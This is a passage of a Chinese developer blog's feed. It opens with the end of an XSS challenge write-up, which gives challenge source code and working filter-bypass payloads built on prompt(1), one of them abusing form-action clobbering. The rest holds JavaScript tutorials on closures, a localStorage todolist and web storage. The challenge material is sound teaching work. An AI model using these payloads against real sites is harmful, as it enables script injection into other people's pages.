class="line">"  type=image  src  onerror </span><br><span class="line">=" prompt(1)</span><br></pre></td></tr></table></figure><h3 id="challenge-6"><a href="#challenge-6" class="headerlink" title="challenge 6"></a>challenge 6</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是关于表单的，表单里面有个action，如果在form表单里面有个input 的name也叫action的话，name获取action时候得到的input里面的内容不是表单的内容。</p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":1&#125;</span><br></pre></td></tr></table></figure><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="http://drops.xmd5.com/static/drops/tips-3059.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-3059.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XSS-Challenge&quot;&gt;&lt;a href=&quot;#XSS-Challenge&quot; class=&quot;headerlink&quot; title=&quot;XSS Challenge&quot;&gt;&lt;/a&gt;XSS Challenge&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;今天无意中看见这个然后顺便做了一下，
      
    
    </summary>
    
      <category term="xss" scheme="http://onekingcc.github.io/categories/xss/"/>
    
    
      <category term="xss" scheme="http://onekingcc.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>对闭包的一次理解</title>
    <link href="http://onekingcc.github.io/2019/08/20/%E5%AF%B9%E9%97%AD%E5%8C%85%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8E%A2%E8%AE%A8/"/>
    <id>http://onekingcc.github.io/2019/08/20/对闭包的一次探讨/</id>
    <published>2019-08-20T09:07:15.695Z</published>
    <updated>2019-08-20T09:19:36.226Z</updated>
    
    <content type="html"><![CDATA[<h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>​    先了解变量作用域，因为变量根据作用域的不同分为全局作用域和局部作用域，可以简单的理解为在函数的内部称为局部变量，在函数外部称为全局作用域。在函数的内部是可以使用全局变量的，在函数外部是不可以访问函数内部的变量。当函数执行完毕之后，函数内的局部变量就会被销毁。</p><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>这里引用JavaScript高级程序设计的：<strong>闭包（closure）就是指有权访问另一个函数作用域中变量的函数</strong></p><p>我理解的这句话 其实闭包就是函数，一个作用域可以访问另一个函数内的局部变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(num);<span class="comment">//2</span></span><br><span class="line">              </span><br><span class="line">          &#125;</span><br><span class="line">          fun();</span><br><span class="line">      &#125; </span><br><span class="line">      init();</span><br></pre></td></tr></table></figure><p>这里打印了2，很明显在fun()这个函数的作用域访问了init()里面的局部变量这里就产生了闭包，</p><p><img src="/images/js/1566286638315.png" alt="1566286638315"></p><p>发现init()就是我们的闭包函数里面num就是被访问的局部变量</p><h3 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h3><p>可以让我们init()外面的作用域可以访问init内部局部变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(num);</span><br><span class="line">              </span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> fun;</span><br><span class="line">      &#125; </span><br><span class="line">     <span class="keyword">var</span> i = init();</span><br><span class="line">  i();</span><br></pre></td></tr></table></figure><p>函数也是一种数据类型，所以也可以当做参数类型传递，同样也可以当值返回回来，这里调用了init()函数，就会有fun()函数的返回，这样就可以实现init()外面的作用域访问内部的作用域了。这里分析一下：一旦<code>init()</code>一调用就会去执行<code>function init()</code>里面的var  num = 2然后function fun()没调用所以 不执行，然后直接return fun。所以这里的var i =init()就是类似于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的i就是相当于一个函数，这里如果访问了num=2是不是就是相当于就访问了内部的局部变量</p><p><img src="/images/js/1566288230773.png" alt="1566288230773"></p><p><img src="/images/js/1566288532991.png" alt="1566288532991"></p><p>这里发现我们i里面存的就是fun()这个函数，再一调用就会去执行fun函数里面的，一进去就会产生一个闭包指向init()函数值为2。</p><p><img src="/images/js/1566288857770.png" alt="1566288857770"></p><p>这里知道了闭包的作用就是：<strong>延伸了变量的作用范围</strong>以前函数内部的变量只能本函数使用，现在使用了闭包后我i()这个函数也能使用里面的变量。正常的函数就是当函数执行完毕之后，函数内的局部变量就会被销毁。但是这里当<code>var i = init()</code>执行完之后这里<strong>i()</strong>等着被调用要等被调用完之后num这个变量才被销毁。</p><h3 id="闭包应用"><a href="#闭包应用" class="headerlink" title="闭包应用"></a>闭包应用</h3><p>通过闭包的方式得到当前的li的值，这里通过立即执行函数来获取里面的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>java<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>c<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>python<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> lis = <span class="built_in">document</span>.querySelector(<span class="string">'.nav'</span>).querySelectorAll(<span class="string">'li'</span>);</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;lis.length;i++)&#123;</span><br><span class="line">           (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">               <span class="comment">// console.log(lis[i].innerHTML);</span></span><br><span class="line">               lis[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                   <span class="built_in">console</span>.log(i);</span><br><span class="line">                   <span class="built_in">console</span>.log(lis[i].innerHTML);                    </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;)(i);</span><br><span class="line">           </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>这里的闭包是因为我的onclick事件后面是一个函数，而在外面我的function(i)也是一个立即执行函数，这里console.log的里面的i是function(i)里面穿过来的i所以就是我function里面的作用域去访问function(i)函数内的值。打个断点可以看一下，一点击就发现就会有我们的Clousure</p><p><img src="/images/js/1566291517388.png" alt="1566291517388"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;函数作用域&quot;&gt;&lt;a href=&quot;#函数作用域&quot; class=&quot;headerlink&quot; title=&quot;函数作用域&quot;&gt;&lt;/a&gt;函数作用域&lt;/h3&gt;&lt;p&gt;​    先了解变量作用域，因为变量根据作用域的不同分为全局作用域和局部作用域，可以简单的理解为在函数的内部称为局部
      
    
    </summary>
    
      <category term="js" scheme="http://onekingcc.github.io/categories/js/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>记一次todolist的开发过程</title>
    <link href="http://onekingcc.github.io/2019/08/19/%E8%AE%B0%E4%B8%80%E6%AC%A1todolist%E7%9A%84%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B/"/>
    <id>http://onekingcc.github.io/2019/08/19/记一次todolist的开发过程/</id>
    <published>2019-08-19T02:22:16.150Z</published>
    <updated>2019-08-19T02:26:40.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现toDoList"><a href="#实现toDoList" class="headerlink" title="实现toDoList"></a>实现<code>toDoList</code></h2><h3 id="todolist功能需求"><a href="#todolist功能需求" class="headerlink" title="todolist功能需求"></a>todolist功能需求</h3><p>①  文本框里面输入内容，按下回车，就可以生成待办事项</p><p>②  点击代办事项复选框，就可以把当前的数据添加到已完成的事项里面</p><p>③  点击已完成的复选框，就可以把当前数据添加到待办事项里面</p><p>④  然后刷新本页面数据不会丢失</p><h3 id="todolist思路分析"><a href="#todolist思路分析" class="headerlink" title="todolist思路分析"></a>todolist思路分析</h3><p>​    这里要求刷新页面数据不会丢失因此需要用本地存储<code>localstorage</code>这里不管是按下的是回车，还是点击的复选框，都是把本地存储的数据加载到页面中，这样保证刷新的时候不会丢失数据。存储的格式 var todolist = [{title: ‘ xxx’,done :’false’}]</p><p>这里本地存储<code>localstorage</code>只能存储字符串的格式,因此需要将对象转换为字符串<code>JSON.stringfy(data)</code></p><h3 id="按下回车数据存储到本地存储"><a href="#按下回车数据存储到本地存储" class="headerlink" title="按下回车数据存储到本地存储"></a>按下回车数据存储到本地存储</h3><p>​    这里要注意的是页面的数据都是从本地存储里面存取的，这样页面就不会丢失数据，所以要将数据保存到本地</p><p>​    利用事件对象keycode判断用户是否按下回车(13)</p><p>​    声明一个数组，保存数据</p><p>​    先要读取本地原来存储的数据(getData())放到数组里面</p><p>之后将最新的数据从表单获取过来的数据，追加到数组中，这里因为这个数组是在内存当中</p><p>所以最后将数组存储到本地存储(声明函数``saveData()`</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#title"</span>).on(<span class="string">"keydown"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($(<span class="keyword">this</span>).val() === <span class="string">""</span>) &#123;</span><br><span class="line">                alert(<span class="string">"请输入您要的操作"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 先读取本地存储原来的数据</span></span><br><span class="line">                <span class="keyword">var</span> local = getDate();</span><br><span class="line">                <span class="comment">// console.log(local);</span></span><br><span class="line">                <span class="comment">// 把local数组进行更新数据 把最新的数据追加给local数组</span></span><br><span class="line">                local.push(&#123; <span class="attr">title</span>: $(<span class="keyword">this</span>).val(), <span class="attr">done</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">                <span class="comment">// 把这个数组local 存储给本地存储</span></span><br><span class="line">                saveDate(local);</span><br><span class="line">                <span class="comment">// 2. toDoList 本地存储数据渲染加载到页面</span></span><br><span class="line">                load();</span><br><span class="line">                $(<span class="keyword">this</span>).val(<span class="string">""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="读取本地数据，保存本地数据"><a href="#读取本地数据，保存本地数据" class="headerlink" title="读取本地数据，保存本地数据"></a>读取本地数据，保存本地数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 读取本地存储数据</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span>  data = localStorage.getItem(<span class="string">"todolist"</span>);</span><br><span class="line">        <span class="keyword">if</span>(data !== <span class="string">""</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">           </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存本地数据</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        localStorage.setItem(<span class="string">"todolist"</span>, <span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="todolist本地存储渲染到页面"><a href="#todolist本地存储渲染到页面" class="headerlink" title="todolist本地存储渲染到页面"></a>todolist本地存储渲染到页面</h3><p>渲染一个加载操作声明一个load函数方便调用</p><p>每次读取本地数据之前都必须要将数据转化为对象的格式</p><p>遍历这个数据用(.$each()),有几条数据就生成几个li添加到ol里面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 读取本地存储的数据</span></span><br><span class="line">        <span class="keyword">var</span> data = getDate();</span><br><span class="line">        <span class="comment">// console.log(data);</span></span><br><span class="line">        <span class="comment">// 遍历之前先要清空ol里面的元素内容</span></span><br><span class="line">        $(<span class="string">"ol, ul"</span>).empty();</span><br><span class="line">        <span class="keyword">var</span> todoCount = <span class="number">0</span>; <span class="comment">// 正在进行的个数</span></span><br><span class="line">        <span class="keyword">var</span> doneCount = <span class="number">0</span>; <span class="comment">// 已经完成的个数</span></span><br><span class="line">        <span class="comment">// 遍历这个数据</span></span><br><span class="line">        $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">i, n</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// console.log(n);</span></span><br><span class="line">            <span class="keyword">if</span> (n.done) &#123;</span><br><span class="line">                $(<span class="string">"ul"</span>).prepend(<span class="string">"&lt;li&gt;&lt;input type='checkbox' checked='checked' &gt; &lt;p&gt;"</span> + n.title + <span class="string">"&lt;/p&gt; &lt;a href='javascript:;' id="</span> + i + <span class="string">" &gt;&lt;/a&gt;&lt;/li&gt;"</span>);</span><br><span class="line">                doneCount++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">"ol"</span>).prepend(<span class="string">"&lt;li&gt;&lt;input type='checkbox' &gt; &lt;p&gt;"</span> + n.title + <span class="string">"&lt;/p&gt; &lt;a href='javascript:;' id="</span> + i + <span class="string">" &gt;&lt;/a&gt;&lt;/li&gt;"</span>);</span><br><span class="line">                todoCount++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="todolist删除操作"><a href="#todolist删除操作" class="headerlink" title="todolist删除操作"></a>todolist删除操作</h3><p>点击里面a连接，不是删除的li而是删除本第存储对应数据</p><p>核心原理： 先获取本地存储数据，删除对应数据，保存本地数据重新渲染列表li</p><p>可以给链接自己定义属性记录当前的索引号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. toDoList 删除操作</span></span><br><span class="line">    $(<span class="string">"ol, ul"</span>).on(<span class="string">"click"</span>, <span class="string">"a"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="comment">// 先获取本地存储</span></span><br><span class="line">        <span class="keyword">var</span> data = getData();</span><br><span class="line">        <span class="comment">// 修改数据</span></span><br><span class="line">        <span class="keyword">var</span> index = $(<span class="keyword">this</span>).attr(<span class="string">"id"</span>);</span><br><span class="line">        <span class="comment">// console.log(index);</span></span><br><span class="line">        data.splice(index, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 保存到本地存储</span></span><br><span class="line">        saveDate(data);</span><br><span class="line">        <span class="comment">// 重新渲染页面</span></span><br><span class="line">        load();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="toDoList-正在进行和已完成选项操作"><a href="#toDoList-正在进行和已完成选项操作" class="headerlink" title="toDoList 正在进行和已完成选项操作"></a>toDoList 正在进行和已完成选项操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"ol, ul"</span>).on(<span class="string">"click"</span>, <span class="string">"input"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="comment">// 先获取本地存储的数据</span></span><br><span class="line">        <span class="keyword">var</span> data = getData();</span><br><span class="line">        <span class="comment">// 修改数据</span></span><br><span class="line">        <span class="keyword">var</span> index = $(<span class="keyword">this</span>).siblings(<span class="string">"a"</span>).attr(<span class="string">"id"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(index);</span><br><span class="line">        <span class="comment">// data[?].done = ?</span></span><br><span class="line">        data[index].done = $(<span class="keyword">this</span>).prop(<span class="string">"checked"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存到本地存储</span></span><br><span class="line">        saveData(data);</span><br><span class="line">        <span class="comment">// 重新渲染页面</span></span><br><span class="line">        load();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实现toDoList&quot;&gt;&lt;a href=&quot;#实现toDoList&quot; class=&quot;headerlink&quot; title=&quot;实现toDoList&quot;&gt;&lt;/a&gt;实现&lt;code&gt;toDoList&lt;/code&gt;&lt;/h2&gt;&lt;h3 id=&quot;todolist功能需求&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>关于本地存储</title>
    <link href="http://onekingcc.github.io/2019/08/13/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"/>
    <id>http://onekingcc.github.io/2019/08/13/本地存储/</id>
    <published>2019-08-13T05:54:12.996Z</published>
    <updated>2019-08-13T06:00:57.150Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h4><p>​    1. 数据存储在用户浏览器中</p><p>​    2. 设置，读取方便，页面刷新不会丢失数据</p><p>​    3. 容量较大，<code>sessionStorage</code>约5M，<code>localStorage</code>约20M</p><p>​    4. 只能存储在字符串可以将对象 JSON.stringify()编码后存储</p><h4 id="window-sessionStorage"><a href="#window-sessionStorage" class="headerlink" title="window.sessionStorage"></a>window.sessionStorage</h4><ol><li><p>生命周期为关闭浏览器</p></li><li><p>在同一个窗口下数据可以共享</p></li><li><p>以键值对的方式存储使用</p><h5 id="存储数据："><a href="#存储数据：" class="headerlink" title="存储数据："></a>存储数据：</h5><p><code>sessionStorage.setItem</code>(key,value)</p><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p><code>sessionStorage.getItem</code>(key)</p><h5 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h5><p><code>sessionStorage.removeItem</code>(key)</p><h5 id="删除所有的数据"><a href="#删除所有的数据" class="headerlink" title="删除所有的数据"></a>删除所有的数据</h5><p><code>sessionStorage.clear()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"set"</span>&gt;存储数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="get"&gt;获取数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"remove"</span>&gt;删除数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="del"&gt;清除所有数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ipt = <span class="built_in">document</span>.querySelector(<span class="string">'input'</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">set</span> = document.querySelector('.<span class="keyword">set</span>');</span><br><span class="line">        var <span class="keyword">get</span> = document.querySelector('.<span class="keyword">get</span>');</span><br><span class="line">        var re = document.querySelector('.remove');</span><br><span class="line">        var del = document.querySelector('.del');</span><br><span class="line">        <span class="keyword">set</span>.addEventListener('click', function () &#123;</span><br><span class="line">            <span class="comment">//当点击之后就把输入框里面的值存储起来</span></span><br><span class="line">            <span class="keyword">var</span> val = ipt.value;</span><br><span class="line">            sessionStorage.setItem(<span class="string">'onekingcc'</span>,val);</span><br><span class="line">            sessionStorage.setItem(<span class="string">'ni'</span>,val);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="keyword">get</span>.addEventListener('click',function() &#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            <span class="built_in">console</span>.log( sessionStorage.getItem(<span class="string">'onekingcc'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 移除数据</span></span><br><span class="line">        re.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            sessionStorage.removeItem(<span class="string">'onekingcc'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//删除所有数据</span></span><br><span class="line">        del.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            sessionStorage.clear();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="window-localStorage"><a href="#window-localStorage" class="headerlink" title="window.localStorage"></a>window.localStorage</h4><ol><li><p>生命周期永久生效除非手动删除，就算关闭页面也会存在</p></li><li><p>同浏览器不同页面也可相互调用(多窗口共享)</p></li><li><p>以键值对存储</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 